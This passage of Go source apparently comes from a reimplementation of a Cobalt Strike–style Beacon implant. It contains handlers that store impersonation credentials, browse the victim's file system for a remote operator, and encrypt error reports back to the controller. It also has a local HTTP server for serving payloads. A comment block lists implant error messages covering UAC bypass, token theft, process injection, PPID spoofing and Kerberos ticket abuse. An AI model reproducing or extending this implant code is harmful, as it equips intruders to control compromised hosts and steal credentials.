	domain := string(domainBuf)

	usernameLengthBuf := make([]byte, 4)
	_, err = buf.Read(usernameLengthBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return false
	}
	usernameLength := ReadInt(usernameLengthBuf)
	usernameBuf := make([]byte, usernameLength)
	_, err = buf.Read(usernameBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return false
	}
	username := string(usernameBuf)

	passwordLengthBuf := make([]byte, 4)
	_, err = buf.Read(passwordLengthBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return false
	}
	passwordLength := ReadInt(passwordLengthBuf)
	passwordBuf := make([]byte, passwordLength)
	_, err = buf.Read(passwordBuf)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return false
	}
	password := string(passwordBuf)

	fmt.Printf("Setting credentials for user \"%s\\%s:%s\"", domain, username, password)
	config.StoredCredentials = &config.StoredCredential{domain, username, password}
	return true
}

func File_Browse(b []byte) []byte {
	buf := bytes.NewBuffer(b)
	//resultStr := ""
	pendingRequest := make([]byte, 4)
	dirPathLenBytes := make([]byte, 4)

	_, err := buf.Read(pendingRequest)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}
	_, err = buf.Read(dirPathLenBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	dirPathLen := binary.BigEndian.Uint32(dirPathLenBytes)
	dirPathBytes := make([]byte, dirPathLen)
	_, err = buf.Read(dirPathBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	// list files
	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")

	// build string for result
	/*
	   /Users/xxxx/Desktop/dev/deacon/*
	   D       0       25/07/2020 09:50:23     .
	   D       0       25/07/2020 09:50:23     ..
	   D       0       09/06/2020 00:55:03     cmd
	   D       0       20/06/2020 09:00:52     obj
	   D       0       18/06/2020 09:51:04     Util
	   D       0       09/06/2020 00:54:59     bin
	   D       0       18/06/2020 05:15:12     config
	   D       0       18/06/2020 13:48:07     crypt
	   D       0       18/06/2020 06:11:19     Sysinfo
	   D       0       18/06/2020 04:30:15     .vscode
	   D       0       19/06/2020 06:31:58     packet
	   F       272     20/06/2020 08:52:42     deacon.csproj
	   F       6106    26/07/2020 04:08:54     Program.cs
	*/
	fileInfo, err := os.Stat(dirPathStr)
	if err != nil {
		processErrorTest(40, 0, 0, err.Error())
		return nil
	}
	modTime := fileInfo.ModTime()
	currentDir := fileInfo.Name()

	absCurrentDir, err := filepath.Abs(currentDir)
	if err != nil {
		processErrorTest(40, 0, 0, err.Error())
		// panic(err)
	}
	modTimeStr := modTime.Format("02/01/2006 15:04:05")
	resultStr := ""
	if dirPathStr == "./" {
		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
	} else {
		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
	}
	//resultStr := fmt.Sprintf("%s/*", absCurrentDir)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
	files, err := ioutil.ReadDir(dirPathStr)
	for _, file := range files {
		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")

		if file.IsDir() {
			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
		} else {
			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
		}
	}
	//fmt.Println(resultStr)

	return util.BytesCombine(pendingRequest, []byte(resultStr))

}

// error ids
//
// 0 = "DEBUG: " + errMsgBytes
// 1 = "Failed to get token"
// 2 = "BypassUAC is for Windows 7 and later"
// 3 = "You're already an admin"
// 4 = "could not connect to pipe"
// 5 = "Maximum links reached. Disconnect one"
// 6 = "I'm already in SMB mode"
// 7 = "could not run command (w/ token) because of its length of " + arg1Bytes + " bytes!"
// 8 = "could not upload file: " + arg1Bytes
// 9 = "could not get file time: " + arg1Bytes
// 10 = "could not set file time: " + arg1Bytes
// 11 = "Could not create service: " + arg1Bytes
// 12 = "Failed to impersonate token: " + arg1Bytes
// 13 = "copy failed: " + arg1Bytes
// 14 = "move failed: " + arg1Bytes
// 15 = "ppid " + arg1Bytes + " is in a different desktop session (spawned jobs may fail). Use 'ppid' to reset."
// 16 = "could not write to process memory: " + arg1Bytes
// 17 = "could not adjust permissions in process: " + arg1Bytes
// 18 = arg1Bytes + " is an x64 process (can't inject x86 content)"
// 19 = arg1Bytes + " is an x86 process (can't inject x64 content)"
// 20 = "Could not connect to pipe: " + arg1Bytes
// 21 = "Could not bind to " + arg1Bytes
// 22 = "Command length (" + arg1Bytes + ") too long"
// 23 = "could not create pipe: " + arg1Bytes
// 24 = "Could not create token: " + arg1Bytes
// 25 = "Failed to impersonate token: " + arg1Bytes
// 26 = "Could not start service: " + arg1Bytes
// 27 = "Could not set PPID to " + arg1Bytes
// 28 = "kerberos ticket purge failed: " + arg1Bytes
// 29 = "kerberos ticket use failed: " + arg1Bytes
// 30 = "Could not open process token: " + arg1Bytes + " (" + arg2Bytes + ")"
// 31 = "could not allocate " + arg1Bytes + " bytes in process: " + arg2Bytes
// 32 = "could not create remote thread in " + arg1Bytes + ": " + arg2Bytes
// 33 = "could not open process " + arg1Bytes + ": " + arg2Bytes
// 34 = "Could not set PPID to " + arg1Bytes + ": " + arg2Bytes
// 35 = "Could not kill " + arg1Bytes + ": " + arg2Bytes
// 36 = "Could not open process token: " + arg1Bytes + " (" + arg2Bytes + ")"
// 37 = "Failed to impersonate token from " + arg1Bytes + " (" + arg2Bytes + ")"
// 38 = "Failed to duplicate primary token for " + arg1Bytes + " (" + arg2Bytes + ")"
// 39 = "Failed to impersonate logged on user " + arg1Bytes + " (" + arg2Bytes + ")"
// 40 = "Could not open '" + errMsgBytes + "'"
// 41 = "could not spawn " + errMsgBytes + " (token): " + arg1Bytes
// 48 = "could not spawn " + errMsgBytes + ": " + arg1Bytes
// 49 = "could not open " + errMsgBytes + ": " + arg1Bytes
// 50 = "Could not connect to pipe (" + errMsgBytes + "): " + arg1Bytes
// 51 = "Could not open service control manager on " + errMsgBytes + ": " + arg1Bytes
// 52 = "could not open " + errMsgBytes + ": " + arg1Bytes
// 53 = "could not run " + errMsgBytes
// 54 = "Could not create service " + errMsgBytes
// 55 = "Could not start service " + errMsgBytes
// 56 = "Could not query service " + errMsgBytes
// 57 = "Could not delete service " + errMsgBytes
// 58 = "Privilege '" + errMsgBytes + "' does not exist"
// 59 = "Could not open process token"
// 60 = "File '" + errMsgBytes + "' is either too large (>4GB) or size check failed"
// 61 = "Could not determine full path of '" + errMsgBytes + "'"
// 62 = "Can only LoadLibrary() in same-arch process"
// 63 = "Could not open registry key: " + arg1Bytes
// 64 = "x86 Beacon cannot adjust arguments in x64 process"
// 65 = "Could not adjust arguments in process: " + arg1Bytes
// 66 = "Real arguments are longer than fake arguments."
// 67 = "x64 Beacon cannot adjust arguments in x86 process"
// 68 = "Could not connect to target"
// 69 = "could not spawn " + errMsgBytes + " (token&creds): " + arg1Bytes
// 70 = "Could not connect to target (stager)"
// 71 = "Could not update process attribute: " + arg1Bytes
// 72 = "could not create remote thread in " + arg1Bytes + ": " + arg2Bytes
// 73 = "allocate section and copy data failed: " + arg1Bytes
// 74 = "could not spawn " + errMsgBytes + " (token) with extended startup information. Reset ppid, disable blockdlls, or rev2self to drop your token."
// 75 = "current process will not auto-elevate COM object. Try from a program that lives in c:\\windows\\*"

func processErrorTest(errId int, errArg1 int, errArg2 int, err string) {
	fmt.Printf("Error with code %d received\n", errId)

	errIdBytes := WriteInt(errId)  // must be zero
	arg1Bytes := WriteInt(errArg1) // for debug
	arg2Bytes := WriteInt(errArg2)
	errMsgBytes := []byte(err)
	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
	fmt.Printf("Error byte array: [%x]\n", result)
	finalPacket := MakePacket(BEACON_RSP_BEACON_ERROR, result)
	PushResult(EncryptPacket(finalPacket))
	// errorBuf = append(errorBuf, finalPacket...)
}

func UTF16BytesToString(b []byte, o binary.ByteOrder) string {
	utf := make([]uint16, (len(b)+(2-1))/2)
	for i := 0; i+(2-1) < len(b); i += 2 {
		utf[i/2] = o.Uint16(b[i:])
	}
	if len(b)/2 < len(utf) {
		utf[len(utf)-1] = '\uFFFD'
	}
	return string(utf16.Decode(utf))
}

func powershellDecode(messageBase64 string) (retour string, err error) {
	messageUtf16LeByteArray, err := base64.StdEncoding.DecodeString(messageBase64)

	if err != nil {
		return "", err
	}

	message := UTF16BytesToString(messageUtf16LeByteArray, binary.LittleEndian)

	return message, nil
}

func HostFileLocally(port int, file []byte) {
	go func() {
		ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
		if err != nil {
			fmt.Printf("error listening on port %d", port)
		}

		conn, err := ln.Accept()
		if err != nil {
			fmt.Printf("failed to accept connection")
		}
		defer conn.Close()
		conn.Write([]byte(fmt.Sprintf("HTTP/1.1 200 OK\n\n %s", file)))
	}() // Note the parentheses. We must call the anonymous function.
}

func CheckBeaconMagicBytes(b []byte) bool {
	nullSlice := []byte{52, 100, 53, 97}
	for i, v := range b {
		if v != nullSlice[i] {
			return false
		}
	}
	return true

}
